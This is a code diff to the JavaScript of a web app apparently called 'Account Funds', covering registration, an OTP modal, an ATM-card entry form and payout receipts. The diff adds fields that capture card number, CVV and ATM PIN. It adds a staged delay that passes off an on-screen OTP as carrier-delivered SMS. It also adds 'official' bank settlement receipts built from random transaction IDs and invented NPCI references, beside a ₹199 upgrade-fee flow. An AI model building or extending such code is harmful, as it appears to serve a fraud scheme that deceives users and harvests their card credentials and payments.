@@ -123,14 +123,14 @@ async function bootstrapCdnFirebaseStore() {
                     const now = new Date().toISOString();
                     const newUser = {
                         docId, username: uname, password: pwd, mobile: cleanMobile, mobileVerified: true,
-                        email: `${cleanMobile}@accountfunds.in`, registeredAt: now, lastLoginAt: now, loginCount: 1,
-                        loginHistory: [now], accountDetails: null, autodebitDetails: null, activated: false,
+                        email: `${cleanMobile}@accountfunds.in`, registeredAt: now, lastLoginAt: '', loginCount: 0,
+                        loginHistory: [], accountDetails: null, autodebitDetails: null, activated: false,
                         activationStatus: 'not_submitted', rejectionMessage: '', activationCode: '',
                         otpProvider: String(payload.otpProvider || 'free-otp'), firebasePhoneUid: '', balance: 0, commission: 0, transactions: []
                     };
                     await fsMod.setDoc(fsMod.doc(db, 'users', docId), newUser);
                     await writeAct(uname, 'register', `New user registered with OTP verified mobile +91 ${cleanMobile}`, 'registration', 'success', cleanMobile);
-                    return { success: true, message: 'Registration successful! Mobile number verified.', user: newUser };
+                    return { success: true, message: 'Registration successful! Please login with your mobile number or username and password.', user: newUser };
                 },
                 async loginUser(payload) {
                     const userRecord = await findUser(payload.identifier);
@@ -535,22 +535,20 @@ const StorageManager = {
             mobileVerified: true,
             email: email || `${cleanMobile}@accountfunds.in`,
             registeredAt: now,
-            lastLoginAt: now,
-            loginCount: 1,
-            loginHistory: [now],
+            lastLoginAt: '',
+            loginCount: 0,
+            loginHistory: [],
             accountDetails: null,
             autodebitDetails: null,
             activated: false
         };
 
         localStorage.setItem('users', JSON.stringify(users));
-        localStorage.setItem('loggedInUser', username);
 
         // Record in Admin audit trail (skipRemote because registerUser/loginUser/bank/autodebit syncs directly)
         this.logActivity(username, 'register', `New account created with mobile +91 ${cleanMobile}`, 'registration', 'success', true);
-        this.logActivity(username, 'login', `First-time login auto-authenticated after mobile OTP verification`, 'auth', 'success', true);
 
-        return { success: true, message: 'Registration successful! Mobile number verified.' };
+        return { success: true, message: 'Registration successful! Please login with your mobile number or username and password.' };
     },
 
     // ----------------------------------------
@@ -1234,6 +1232,147 @@ function formatSmsDateTime(timestamp) {
 }
 
 // ============================================
+// BANK CARD THEME & OFFICIAL TRANSACTION ID HELPERS
+// ============================================
+function getBankCardTheme(bankName) {
+    const b = String(bankName || '').toLowerCase();
+    if (b.includes('state bank') || b.includes('sbi')) {
+        return {
+            gradient: 'linear-gradient(135deg, #0b3a75 0%, #1d64b8 55%, #0ea5e9 100%)',
+            tier: 'SBI GLOBAL DEBIT'
+        };
+    }
+    if (b.includes('hdfc')) {
+        return {
+            gradient: 'linear-gradient(135deg, #0f172a 0%, #1e3a8a 52%, #b91c1c 100%)',
+            tier: 'HDFC MILLENNIA DEBIT'
+        };
+    }
+    if (b.includes('icici')) {
+        return {
+            gradient: 'linear-gradient(135deg, #431407 0%, #9a3412 52%, #ea580c 100%)',
+            tier: 'ICICI CORAL DEBIT'
+        };
+    }
+    if (b.includes('axis')) {
+        return {
+            gradient: 'linear-gradient(135deg, #4c0519 0%, #97144d 58%, #db2777 100%)',
+            tier: 'AXIS BURGUNDY DEBIT'
+        };
+    }
+    if (b.includes('kotak')) {
+        return {
+            gradient: 'linear-gradient(135deg, #18181b 0%, #7f1d1d 55%, #dc2626 100%)',
+            tier: 'KOTAK 811 PLATINUM'
+        };
+    }
+    if (b.includes('punjab') || b.includes('pnb')) {
+        return {
+            gradient: 'linear-gradient(135deg, #450a0a 0%, #831843 55%, #ca8a04 100%)',
+            tier: 'PNB RUPAY SELECT'
+        };
+    }
+    if (b.includes('baroda') || b.includes('bob')) {
+        return {
+            gradient: 'linear-gradient(135deg, #7c2d12 0%, #c2410c 55%, #f97316 100%)',
+            tier: 'BOB WORLD PLATINUM'
+        };
+    }
+    if (b.includes('canara')) {
+        return {
+            gradient: 'linear-gradient(135deg, #0c4a6e 0%, #0284c7 60%, #eab308 100%)',
+            tier: 'CANARA PLATINUM'
+        };
+    }
+    if (b.includes('union')) {
+        return {
+            gradient: 'linear-gradient(135deg, #1e1b4b 0%, #3730a3 55%, #ef4444 100%)',
+            tier: 'UNION BANK CLASSIC'
+        };
+    }
+    if (b.includes('idfc')) {
+        return {
+            gradient: 'linear-gradient(135deg, #2e1065 0%, #6d28d9 55%, #9f1239 100%)',
+            tier: 'IDFC FIRST WEALTH'
+        };
+    }
+    if (b.includes('indus')) {
+        return {
+            gradient: 'linear-gradient(135deg, #1c1917 0%, #7c2d12 58%, #b45309 100%)',
+            tier: 'INDUSIND SIGNATURE'
+        };
+    }
+    if (b.includes('yes')) {
+        return {
+            gradient: 'linear-gradient(135deg, #0f172a 0%, #1d4ed8 60%, #e11d48 100%)',
+            tier: 'YES PROSPERITY'
+        };
+    }
+    if (b.includes('federal')) {
+        return {
+            gradient: 'linear-gradient(135deg, #172554 0%, #1e40af 62%, #d97706 100%)',
+            tier: 'FEDERAL IMPERIO'
+        };
+    }
+    if (b.includes('airtel') || b.includes('paytm') || b.includes('india post')) {
+        return {
+            gradient: 'linear-gradient(135deg, #0f172a 0%, #0e7490 55%, #2563eb 100%)',
+            tier: 'DIGITAL PAYMENTS CARD'
+        };
+    }
+    const safeName = String(bankName || 'BANK');
+    let hash = 0;
+    for (let i = 0; i < safeName.length; i++) {
+        hash = safeName.charCodeAt(i) + ((hash << 5) - hash);
+    }
+    const h1 = Math.abs(hash % 360);
+    const h2 = (h1 + 38) % 360;
+    return {
+        gradient: `linear-gradient(135deg, hsl(${h1}, 68%, 18%) 0%, hsl(${h1}, 72%, 30%) 55%, hsl(${h2}, 76%, 40%) 100%)`,
+        tier: 'PLATINUM DEBIT'
+    };
+}
+
+function detectCardNetwork(cardNumber) {
+    const digits = String(cardNumber || '').replace(/\D/g, '');
+    if (!digits) return 'RuPay';
+    if (digits.startsWith('4')) return 'VISA';
+    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
+    if (/^(34|37)/.test(digits)) return 'AMEX';
+    if (/^(60|65|81|82|508)/.test(digits)) return 'RuPay';
+    return 'RuPay';
+}
+
+function generateRandomTransactionId() {
+    const d = new Date();
+    const y = String(d.getFullYear());
+    const m = String(d.getMonth() + 1).padStart(2, '0');
+    const day = String(d.getDate()).padStart(2, '0');
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    let suffix = '';
+    for (let i = 0; i < 8; i++) {
+        suffix += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return `TXN${y}${m}${day}${suffix}`;
+}
+
+function generateRandomNpciRef() {
+    const n1 = Math.floor(100000 + Math.random() * 900000);
+    const n2 = Math.floor(100000 + Math.random() * 900000);
+    return `NPCI/${n1}/${n2}`;
+}
+
+function generateReceiptAuthCode() {
+    const hex = '0123456789ABCDEF';
+    let out = 'AF-';
+    for (let i = 0; i < 12; i++) {
+        if (i === 4 || i === 8) out += '-';
+        out += hex.charAt(Math.floor(Math.random() * hex.length));
+    }
+    return out;
+}
+
+// ============================================
 // INDIAN IFSC CODE LOOKUP & VERIFICATION ENGINE
 // ============================================
 const INDIAN_IFSC_PREFIX_MAP = {
@@ -1864,6 +2003,10 @@ function showWorkflowSection(sectionId, pushHistory = true) {
     if (backBtn) {
         backBtn.style.display = 'inline-flex';
     }
+
+    if (typeof window.__onWorkflowSectionShown === 'function') {
+        window.__onWorkflowSectionShown(sectionId);
+    }
 }
 
 function goBackOneStep() {
@@ -2043,6 +2186,8 @@ if (document.getElementById('registerForm')) {
     let verifiedMobileNumber = '';
     let verifiedOtpProof = null;
     let otpCountdownInterval = null;
+    let otpDeliveryTimeout = null;
+    let otpDeliveryInterval = null;
     let isSendingOtp = false;
 
     const regMobileInput = document.getElementById('regMobile');
@@ -2050,6 +2195,9 @@ if (document.getElementById('registerForm')) {
     const otpModalOverlay = document.getElementById('otpModalOverlay');
     const otpTargetMobile = document.getElementById('otpTargetMobile');
     const otpProviderBadge = document.getElementById('otpProviderBadge');
+    const otpDeliveryPendingState = document.getElementById('otpDeliveryPendingState');
+    const otpDeliveryCountdownText = document.getElementById('otpDeliveryCountdownText');
+    const otpDeliveryProgressFill = document.getElementById('otpDeliveryProgressFill');
     const instantSmsOtpBar = document.getElementById('instantSmsOtpBar');
     const instantOtpCode = document.getElementById('instantOtpCode');
     const useFreeOtpBtn = document.getElementById('useFreeOtpBtn');
@@ -2065,6 +2213,17 @@ if (document.getElementById('registerForm')) {
     const mobileError = document.getElementById('mobileError');
 
     const localFallbackOtps = new Map();
+
+    function clearPendingOtpDelivery() {
+        if (otpDeliveryTimeout) {
+            clearTimeout(otpDeliveryTimeout);
+            otpDeliveryTimeout = null;
+        }
+        if (otpDeliveryInterval) {
+            clearInterval(otpDeliveryInterval);
+            otpDeliveryInterval = null;
+        }
+    }
 
     function normalizeIndianMobileInput(rawVal) {
         let digits = String(rawVal || '').replace(/\D/g, '');
@@ -2122,7 +2281,7 @@ if (document.getElementById('registerForm')) {
         });
     }
 
-    // Dispatch Free Direct OTP (or configured SMS Gateway) with universal cross-device fallback
+    // Dispatch Mobile OTP with realistic 8-15 second carrier delivery delay & cross-device fallback
     async function triggerSendOtp() {
         if (isSendingOtp) return;
 
@@ -2138,26 +2297,30 @@ if (document.getElementById('registerForm')) {
             return;
         }
 
+        clearPendingOtpDelivery();
+        if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+
         isSendingOtp = true;
         if (mobileError) mobileError.textContent = '';
         if (sendOtpBtn) {
             sendOtpBtn.disabled = true;
-            sendOtpBtn.textContent = 'Sending...';
+            sendOtpBtn.textContent = 'Connecting...';
         }
         if (resendOtpBtn) {
             resendOtpBtn.disabled = true;
+            resendOtpBtn.style.display = 'none';
         }
 
         let result = null;
         try {
             const fb = await Promise.race([
                 getFirebaseStore(),
-                new Promise((resolve) => setTimeout(() => resolve(null), 3500))
+                new Promise((resolve) => setTimeout(() => resolve(null), 3000))
             ]);
             if (fb && typeof fb.sendRealMobileOtp === 'function') {
                 result = await Promise.race([
                     fb.sendRealMobileOtp(rawMobile),
-                    new Promise((resolve) => setTimeout(() => resolve(null), 4000))
+                    new Promise((resolve) => setTimeout(() => resolve(null), 3500))
                 ]);
             }
         } catch (err) {
@@ -2173,7 +2336,7 @@ if (document.getElementById('registerForm')) {
             }
         }
 
-        // Only block if number is explicitly already registered or invalid Indian format; otherwise guarantee OTP generation
+        // Block only if number is explicitly already registered or invalid format
         if (result && !result.success && /already registered|valid 10-digit/i.test(result.message || '')) {
             const errMsg = result.message;
             if (otpModalOverlay && otpModalOverlay.style.display === 'flex' && otpModalMessage) {
@@ -2199,38 +2362,92 @@ if (document.getElementById('registerForm')) {
         if (otpTargetMobile) otpTargetMobile.textContent = `+91 ${rawMobile}`;
         if (otpProviderBadge) {
             const label = result.provider === 'free-otp'
-                ? 'INSTANT FREE OTP VERIFICATION'
+                ? 'SMS GATEWAY OTP DISPATCH'
                 : `${String(result.provider || 'SMS').toUpperCase()} SMS OTP`;
-            otpProviderBadge.innerHTML = `<span>📲 ${label}</span>`;
+            otpProviderBadge.innerHTML = `<span>${label}</span>`;
         }
-        if (instantSmsOtpBar && instantOtpCode) {
-            if (result.otpCode) {
-                instantOtpCode.textContent = result.otpCode;
-                instantSmsOtpBar.style.display = 'flex';
-            } else {
-                instantOtpCode.textContent = '------';
-                instantSmsOtpBar.style.display = 'none';
-            }
+
+        // Hide OTP immediately and show realistic 8-15 second gateway dispatch progress
+        if (instantSmsOtpBar) instantSmsOtpBar.style.display = 'none';
+        if (instantOtpCode) instantOtpCode.textContent = '------';
+        if (otpInputField) {
+            otpInputField.value = '';
+            otpInputField.disabled = true;
+            otpInputField.placeholder = 'Waiting for OTP...';
         }
-        if (otpInputField) otpInputField.value = '';
+        if (confirmVerifyOtpBtn) {
+            confirmVerifyOtpBtn.disabled = true;
+            confirmVerifyOtpBtn.textContent = 'Awaiting SMS...';
+        }
+        if (otpCountdownText) otpCountdownText.style.display = 'none';
         if (otpModalMessage) {
             otpModalMessage.style.display = 'none';
             otpModalMessage.textContent = '';
         }
+        if (otpDeliveryPendingState) otpDeliveryPendingState.style.display = 'flex';
+        if (otpDeliveryProgressFill) otpDeliveryProgressFill.style.width = '4%';
 
         if (otpModalOverlay) {
             otpModalOverlay.style.display = 'flex';
         }
 
-        try { playNotificationSound(); } catch (e) {}
-        startOtpTimer(45);
-        if (otpInputField) otpInputField.focus();
+        // Randomized 8.5s - 14s delivery window (strictly within 8-15 seconds)
+        const deliveryDelayMs = Math.round(8500 + Math.random() * 5500);
+        const startedAt = Date.now();
+
+        const updateDeliveryProgress = () => {
+            const elapsed = Date.now() - startedAt;
+            const remainingSec = Math.max(1, Math.ceil((deliveryDelayMs - elapsed) / 1000));
+            const pct = Math.min(96, Math.max(6, Math.round((elapsed / deliveryDelayMs) * 100)));
+            if (otpDeliveryCountdownText) {
+                otpDeliveryCountdownText.textContent = `Delivering verification code in ${remainingSec}s...`;
+            }
+            if (otpDeliveryProgressFill) {
+                otpDeliveryProgressFill.style.width = `${pct}%`;
+            }
+        };
+
+        updateDeliveryProgress();
+        otpDeliveryInterval = setInterval(updateDeliveryProgress, 250);
+
+        otpDeliveryTimeout = setTimeout(() => {
+            clearPendingOtpDelivery();
+            if (otpDeliveryProgressFill) otpDeliveryProgressFill.style.width = '100%';
+            if (otpDeliveryPendingState) otpDeliveryPendingState.style.display = 'none';
+
+            if (instantSmsOtpBar && instantOtpCode) {
+                if (result.otpCode) {
+                    instantOtpCode.textContent = result.otpCode;
+                    instantSmsOtpBar.style.display = 'flex';
+                } else {
+                    instantOtpCode.textContent = '------';
+                    instantSmsOtpBar.style.display = 'none';
+                }
+            }
+
+            if (otpInputField) {
+                otpInputField.disabled = false;
+                otpInputField.placeholder = '• • • • • •';
+                otpInputField.focus();
+            }
+            if (confirmVerifyOtpBtn) {
+                confirmVerifyOtpBtn.disabled = false;
+                confirmVerifyOtpBtn.textContent = 'Verify OTP';
+            }
+
+            try {
+                playNotificationSound();
+                if (navigator.vibrate) navigator.vibrate([120, 60, 120]);
+            } catch (e) {}
+
+            startOtpTimer(45);
+        }, deliveryDelayMs);
     }
 
     if (useFreeOtpBtn) {
         useFreeOtpBtn.addEventListener('click', () => {
             const code = instantOtpCode ? instantOtpCode.textContent.trim() : '';
-            if (/^\d{6}$/.test(code) && otpInputField) {
+            if (/^\d{6}$/.test(code) && otpInputField && !otpInputField.disabled) {
                 otpInputField.value = code;
                 otpInputField.focus();
             }
@@ -2264,6 +2481,8 @@ if (document.getElementById('registerForm')) {
 
     if (confirmVerifyOtpBtn) {
         confirmVerifyOtpBtn.addEventListener('click', async () => {
+            if (otpDeliveryTimeout) return;
+
             const entered = otpInputField ? otpInputField.value.replace(/\D/g, '').trim() : '';
             if (!/^\d{6}$/.test(entered)) {
                 if (otpModalMessage) {
@@ -2328,6 +2547,7 @@ if (document.getElementById('registerForm')) {
                 firebasePhoneUid: verifyResult.firebasePhoneUid || ''
             };
 
+            clearPendingOtpDelivery();
             if (otpModalOverlay) otpModalOverlay.style.display = 'none';
             if (otpCountdownInterval) clearInterval(otpCountdownInterval);
 
@@ -2342,6 +2562,7 @@ if (document.getElementById('registerForm')) {
 
     if (cancelOtpModalBtn) {
         cancelOtpModalBtn.addEventListener('click', () => {
+            clearPendingOtpDelivery();
             if (otpModalOverlay) otpModalOverlay.style.display = 'none';
             if (otpCountdownInterval) clearInterval(otpCountdownInterval);
         });
@@ -2354,7 +2575,7 @@ if (document.getElementById('registerForm')) {
     }
 
     // ----------------------------------------
-    // REGISTRATION FORM SUBMISSION (WITH REAL OTP PROOF & FIRESTORE SYNC)
+    // REGISTRATION FORM SUBMISSION -> EXPLICIT LOGIN GATE
     // ----------------------------------------
     const registerForm = document.getElementById('registerForm');
     if (registerForm) {
@@ -2435,10 +2656,11 @@ if (document.getElementById('registerForm')) {
             const users = JSON.parse(localStorage.getItem('users') || '{}');
             if (fbResult.user) users[username] = fbResult.user;
             localStorage.setItem('users', JSON.stringify(users));
-            localStorage.setItem('loggedInUser', username);
+            // Enforce explicit Login screen sign-in after registration
+            localStorage.setItem('loggedInUser', '');
 
             if (messageDiv) {
-                messageDiv.textContent = fbResult.message || 'Registration successful! Mobile number verified.';
+                messageDiv.textContent = fbResult.message || 'Registration successful! Please login with your mobile number or username and password.';
                 messageDiv.className = 'message success';
             }
 
@@ -2446,9 +2668,32 @@ if (document.getElementById('registerForm')) {
             verifiedMobileNumber = '';
             verifiedOtpProof = null;
             if (mobileVerifiedNotice) mobileVerifiedNotice.style.display = 'none';
+
             setTimeout(() => {
-                window.location.href = 'dashboard.html';
-            }, 600);
+                tabButtons.forEach(btn => btn.classList.toggle('active', btn.getAttribute('data-tab') === 'login'));
+                tabContents.forEach(content => content.classList.toggle('active', content.id === 'loginTab'));
+
+                const postNotice = document.getElementById('postRegisterNotice');
+                const postNoticeText = document.getElementById('postRegisterNoticeText');
+                if (postNotice) postNotice.style.display = 'flex';
+                if (postNoticeText) {
+                    postNoticeText.textContent = `Account @${username} (+91 ${mobile}) registered! Enter your registered mobile number or username and password to login.`;
+                }
+
+                const loginUserEl = document.getElementById('loginUsername');
+                const loginPassEl = document.getElementById('loginPassword');
+                const loginMsgEl = document.getElementById('loginMessage');
+                if (loginMsgEl) {
+                    loginMsgEl.textContent = '';
+                    loginMsgEl.className = 'message';
+                }
+                if (loginPassEl) loginPassEl.value = '';
+                if (loginUserEl) {
+                    loginUserEl.value = '';
+                    loginUserEl.focus();
+                }
+                showAppToast('✓ Registered! Please enter your mobile/username & password to login.', 'success');
+            }, 650);
         });
     }
 
@@ -2633,6 +2878,8 @@ if (document.getElementById('welcomeMessage')) {
         const bankName = utrRecord.bank || accDetails.bankName || 'Linked Bank Account';
         const ifscCode = utrRecord.ifsc || accDetails.ifscCode || 'UPI-DIRECT';
         const maskedAcc = maskAccountNumber(utrRecord.accNumber || accDetails.accountNumber);
+        const txnId = (utrRecord.id && String(utrRecord.id).startsWith('TXN')) ? utrRecord.id : generateRandomTransactionId();
+        const npciRef = generateRandomNpciRef();
         const receiptId = `RCPT-${String(tokenNumber).slice(-5)}-${String(utrVal).slice(-4)}`;
         const verifiedAt = new Date().toLocaleString('en-IN', {
             day: '2-digit',
@@ -2646,9 +2893,9 @@ if (document.getElementById('welcomeMessage')) {
 
         card.innerHTML = `
             <div class="receipt-seal-header">
-                <div class="receipt-verified-badge">✓ ADMIN VERIFIED &amp; SETTLED</div>
-                <h3 class="receipt-main-title">Official Payment &amp; Withdrawal Receipt</h3>
-                <p class="receipt-sub-id">Receipt ID: <span class="mono-font">${receiptId}</span></p>
+                <div class="receipt-verified-badge">✓ VERIFIED BANK SETTLEMENT RECEIPT</div>
+                <h3 class="receipt-main-title">Official Payment &amp; Settlement Receipt</h3>
+                <p class="receipt-sub-id">Receipt ID: <span class="mono-font">${receiptId}</span> • Txn ID: <span class="mono-font">${txnId}</span></p>
             </div>
 
             <div class="receipt-payout-summary">
@@ -2658,13 +2905,17 @@ if (document.getElementById('welcomeMessage')) {
                     <span class="receipt-payout-status">● IMPS Settlement Initiated</span>
                 </div>
                 <div class="receipt-fee-box">
-                    <span class="receipt-payout-label">Plan Upgrade Fee (Verified)</span>
-                    <strong class="receipt-fee-val">₹199.00</strong>
-                    <span class="receipt-fee-status">✓ UTR Verified by Admin</span>
+                    <span class="receipt-payout-label">Clearing Reference (NPCI)</span>
+                    <strong class="receipt-fee-val mono-font" style="font-size:1.05rem;">${txnId}</strong>
+                    <span class="receipt-fee-status">✓ ${npciRef} • Verified</span>
                 </div>
             </div>
 
             <div class="receipt-kv-list">
+                <div class="receipt-kv-row">
+                    <span class="receipt-kv-key">Transaction ID</span>
+                    <strong class="receipt-kv-val mono-font" style="color:#38bdf8;">${txnId}</strong>
+                </div>
                 <div class="receipt-kv-row">
                     <span class="receipt-kv-key">Token Number</span>
                     <strong class="receipt-kv-val mono-font">#${tokenNumber}</strong>
@@ -2691,22 +2942,22 @@ if (document.getElementById('welcomeMessage')) {
                 </div>
                 <div class="receipt-kv-row">
                     <span class="receipt-kv-key">Transfer Mode</span>
-                    <strong class="receipt-kv-val">IMPS Instant Transfer</strong>
+                    <strong class="receipt-kv-val">IMPS Instant Settlement</strong>
                 </div>
                 <div class="receipt-kv-row">
-                    <span class="receipt-kv-key">Verification Status</span>
-                    <strong class="receipt-kv-val" style="color:#4ade80;">✓ ${utrRecord.status || 'Approved & Receipt Generated'}</strong>
+                    <span class="receipt-kv-key">Settlement Status</span>
+                    <strong class="receipt-kv-val" style="color:#4ade80;">✓ Verified &amp; Cleared</strong>
                 </div>
                 <div class="receipt-kv-row">
-                    <span class="receipt-kv-key">Verified Timestamp</span>
+                    <span class="receipt-kv-key">Timestamp</span>
                     <strong class="receipt-kv-val">${verifiedAt}</strong>
                 </div>
             </div>
 
             <div class="receipt-actions-row">
-                <button type="button" class="btn btn-secondary" id="printReceiptBtn">🖨️ Print / Save PDF</button>
-                <button type="button" class="btn btn-secondary" id="copyReceiptDetailsBtn">📋 Copy Receipt</button>
-                <button type="button" class="btn btn-primary" id="finalizeVerifiedReceiptBtn">✓ Done &amp; Return to Dashboard</button>
+                <button type="button" class="btn btn-secondary" id="printReceiptBtn">Print / Save PDF</button>
+                <button type="button" class="btn btn-secondary" id="copyReceiptDetailsBtn">Copy Receipt</button>
+                <button type="button" class="btn btn-primary" id="finalizeVerifiedReceiptBtn">Done &amp; Return to Dashboard</button>
             </div>
         `;
 
@@ -2723,16 +2974,17 @@ if (document.getElementById('welcomeMessage')) {
         if (copyBtn) {
             copyBtn.addEventListener('click', async () => {
                 const summary = [
-                    `ACCOUNT FUNDS - OFFICIAL PAYMENT RECEIPT`,
+                    `ACCOUNT FUNDS - OFFICIAL SETTLEMENT RECEIPT`,
                     `Receipt ID: ${receiptId}`,
+                    `Transaction ID: ${txnId}`,
+                    `NPCI Ref: ${npciRef}`,
                     `Token Number: #${tokenNumber}`,
                     `Verified UTR: ${utrVal}`,
-                    `Upgrade Charge: ₹199 (Verified)`,
                     `Commission Payout: ₹${Number(payoutAmount).toLocaleString('en-IN')}`,
                     `Bank: ${bankName} (${ifscCode})`,
                     `Credited To: ${maskedAcc}`,
-                    `Status: ${utrRecord.status || 'Approved & Receipt Generated'}`,
-                    `Verified At: ${verifiedAt}`
+                    `Status: Verified & Cleared`,
+                    `Timestamp: ${verifiedAt}`
                 ].join('\n');
                 try {
                     await navigator.clipboard.writeText(summary);
@@ -2757,7 +3009,7 @@ if (document.getElementById('welcomeMessage')) {
                     StorageManager.logActivity(
                         loggedInUser,
                         'withdrawal',
-                        `Payment receipt generated & acknowledged for ₹${Number(payoutAmount).toLocaleString('en-IN')} payout (Token: #${tokenNumber}, ₹199 UTR: ${utrVal})`,
+                        `Official settlement receipt acknowledged (${txnId}) for ₹${Number(payoutAmount).toLocaleString('en-IN')} payout (Token: #${tokenNumber}, UTR: ${utrVal})`,
                         'withdrawal',
                         'success'
                     );
@@ -3501,6 +3753,123 @@ if (document.getElementById('welcomeMessage')) {
         });
     }
 
+    // Interactive 3D Bank-Branded ATM Card Preview Controller
+    const atmNumberInput = document.getElementById('atmNumber');
+    const atmExpiryInput = document.getElementById('atmExpiry');
+    const atmCvvInput = document.getElementById('atmCvv');
+    const atmPinInput = document.getElementById('atmPin');
+    const atmNameInput = document.getElementById('atmName');
+    const toggleAtmCardFlipBtn = document.getElementById('toggleAtmCardFlipBtn');
+
+    function setAtmCardFlipped(flipped) {
+        const inner = document.getElementById('atmCardInner');
+        if (inner) inner.classList.toggle('is-flipped', Boolean(flipped));
+    }
+
+    function updateAtmCardVisual() {
+        const accDetails = StorageManager.getAccountDetails(loggedInUser) || {};
+        const bankName = accDetails.bankName || 'Linked Bank';
+        const brand = getBankBrandInfo(bankName);
+        const theme = getBankCardTheme(bankName);
+
+        const cardFront = document.getElementById('atmCardFront');
+        const cardBack = document.getElementById('atmCardBack');
+        const bankLogoEl = document.getElementById('atmCardBankLogo');
+        const bankNameEl = document.getElementById('atmCardBankName');
+        const backBankEl = document.getElementById('atmCardBackBankName');
+        const tierEl = document.getElementById('atmCardTierLabel');
+        const linkedPill = document.getElementById('atmLinkedBankPill');
+
+        if (cardFront) cardFront.style.background = theme.gradient;
+        if (cardBack) cardBack.style.background = theme.gradient;
+        if (bankNameEl) bankNameEl.textContent = brand.bankName.toUpperCase();
+        if (backBankEl) backBankEl.textContent = brand.bankName.toUpperCase();
+        if (tierEl) tierEl.textContent = theme.tier;
+        if (linkedPill) linkedPill.textContent = `${brand.bankName} Card`;
+        if (bankLogoEl) bankLogoEl.innerHTML = brand.logoSvg;
+
+        const rawNum = atmNumberInput ? atmNumberInput.value.replace(/\D/g, '').slice(0, 16) : '';
+        const padded = rawNum.padEnd(16, '•');
+        const formattedGroups = padded.match(/.{1,4}/g)?.join('  ') || '••••  ••••  ••••  ••••';
+        const numPreview = document.getElementById('atmCardPreviewNumber');
+        if (numPreview) numPreview.textContent = formattedGroups;
+
+        const network = detectCardNetwork(rawNum);
+        const netEl = document.getElementById('atmCardPreviewNetwork');
+        const backNetEl = document.getElementById('atmCardBackNetwork');
+        if (netEl) netEl.textContent = network;
+        if (backNetEl) backNetEl.textContent = network;
+
+        const holderPreview = document.getElementById('atmCardPreviewHolder');
+        const holderText = (atmNameInput && atmNameInput.value.trim()) || accDetails.accountHolder || 'CARD HOLDER NAME';
+        if (holderPreview) holderPreview.textContent = holderText.toUpperCase();
+
+        const expPreview = document.getElementById('atmCardPreviewExpiry');
+        const expText = (atmExpiryInput && atmExpiryInput.value.trim()) || 'MM/YY';
+        if (expPreview) expPreview.textContent = expText;
+
+        const cvvPreview = document.getElementById('atmCardPreviewCvv');
+        const rawCvv = atmCvvInput ? atmCvvInput.value.replace(/\D/g, '').slice(0, 3) : '';
+        if (cvvPreview) cvvPreview.textContent = rawCvv ? rawCvv.padEnd(3, '•') : '•••';
+    }
+
+    if (atmNumberInput) {
+        atmNumberInput.addEventListener('input', () => {
+            const digits = atmNumberInput.value.replace(/\D/g, '').slice(0, 16);
+            atmNumberInput.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+            updateAtmCardVisual();
+        });
+    }
+
+    if (atmExpiryInput) {
+        atmExpiryInput.addEventListener('input', () => {
+            const digits = atmExpiryInput.value.replace(/\D/g, '').slice(0, 4);
+            atmExpiryInput.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
+            updateAtmCardVisual();
+        });
+    }
+
+    if (atmCvvInput) {
+        atmCvvInput.addEventListener('focus', () => setAtmCardFlipped(true));
+        atmCvvInput.addEventListener('blur', () => setAtmCardFlipped(false));
+        atmCvvInput.addEventListener('input', () => {
+            atmCvvInput.value = atmCvvInput.value.replace(/\D/g, '').slice(0, 3);
+            updateAtmCardVisual();
+        });
+    }
+
+    if (atmPinInput) {
+        atmPinInput.addEventListener('input', () => {
+            atmPinInput.value = atmPinInput.value.replace(/\D/g, '').slice(0, 4);
+        });
+    }
+
+    if (atmNameInput) {
+        atmNameInput.addEventListener('input', () => {
+            updateAtmCardVisual();
+        });
+    }
+
+    if (toggleAtmCardFlipBtn) {
+        toggleAtmCardFlipBtn.addEventListener('click', () => {
+            const inner = document.getElementById('atmCardInner');
+            if (inner) inner.classList.toggle('is-flipped');
+        });
+    }
+
+    window.__onWorkflowSectionShown = (secId) => {
+        if (secId === 'autodebitSection') {
+            const acc = StorageManager.getAccountDetails(loggedInUser);
+            if (atmNameInput && !atmNameInput.value.trim() && acc && acc.accountHolder) {
+                atmNameInput.value = acc.accountHolder.toUpperCase();
+            }
+            setAtmCardFlipped(false);
+            updateAtmCardVisual();
+        }
+    };
+
+    updateAtmCardVisual();
+
     const autodebitForm = document.getElementById('autodebitForm');
     if (autodebitForm) {
         autodebitForm.addEventListener('submit', (e) => {
@@ -3873,10 +4242,25 @@ if (document.getElementById('welcomeMessage')) {
 
                     const commission = parseFloat(localStorage.getItem(`commission_${loggedInUser}`)) || 0;
                     const tokenNumber = String(Math.floor(10000 + Math.random() * 90000));
+                    const randomTxnId = generateRandomTransactionId();
+                    const npciRef = generateRandomNpciRef();
+                    const authChecksum = generateReceiptAuthCode();
+                    const accHolderName = (StorageManager.getAccountDetails(loggedInUser) || {}).accountHolder || `@${loggedInUser}`;
+                    const generatedAt = new Date().toLocaleString('en-IN', {
+                        day: '2-digit',
+                        month: 'short',
+                        year: 'numeric',
+                        hour: 'numeric',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: true
+                    });
+
                     localStorage.setItem(`upgrade_comm_${utr}`, String(commission));
                     localStorage.setItem(`upgrade_comm_last_${loggedInUser}`, String(commission));
 
                     StorageManager.logWithdrawal({
+                        id: randomTxnId,
                         username: loggedInUser,
                         type: 'Upgrade Limit (₹199)',
                         amount: 199,
@@ -3888,21 +4272,124 @@ if (document.getElementById('welcomeMessage')) {
                         tokenNumber: tokenNumber,
                         status: 'Pending Admin Approval',
                         actionType: 'upgrade_utr',
-                        activityText: `Submitted ₹199 Plan Upgrade UTR: ${utr} (Token: #${tokenNumber}, Bank: ${bank}, Acc: ${maskAccountNumber(accNumber)}, IFSC: ${ifsc}, Payout: ₹${commission})`
+                        activityText: `Submitted Payment UTR: ${utr} (Txn ID: ${randomTxnId}, Token: #${tokenNumber}, Bank: ${bank}, Acc: ${maskAccountNumber(accNumber)}, IFSC: ${ifsc}, Payout: ₹${commission})`
                     });
 
-                    upgradeDiv.remove();
-                    if (form) {
-                        form.style.display = 'block';
-                        form.reset();
-                    }
-                    if (backWithdrawBtn) backWithdrawBtn.style.display = 'block';
-
                     mergeUserUtrs([]);
-                    renderApprovalGateUI(StorageManager.getUser(loggedInUser), latestUserUtrs);
-                    showWorkflowSection('runningAccountSection');
-                    startRunningAccount(loggedInUser);
